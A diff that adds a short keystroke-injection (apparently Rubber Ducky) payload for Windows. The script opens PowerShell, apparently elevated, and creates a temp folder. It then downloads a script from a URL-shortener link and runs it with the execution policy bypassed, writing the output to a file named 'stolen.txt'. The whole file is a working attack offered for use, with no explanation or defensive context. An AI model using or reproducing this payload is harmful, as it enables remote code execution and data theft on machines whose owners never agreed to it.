@@ -1,0 +1,25 @@
+REM --------------OPEN POWERSHELL
+
+DELAY 100
+CTRL ESC
+DELAY 400
+STRING Windows PowerShell
+DELAY 400
+RIGHT
+DOWN
+ENTER
+DELAY 400
+LEFT
+SHIFT SPACE
+ENTER
+DELAY 300
+STRING mkdir $env:TEMP\\script
+DELAY 500
+ENTER
+STRING  Invoke-WebRequest -Uri https://shorturl.at/ntvBO -OutFile $env:TEMP\\script\\script.ps1
+ENTER
+DELAY 3000
+STRING powershell.exe -ExecutionPolicy Bypass -File $env:TEMP\\script\\script.ps1 > $env:TEMP\\script\\stolen.txt
+ENTER
+DELAY 3000
+STRING DONE
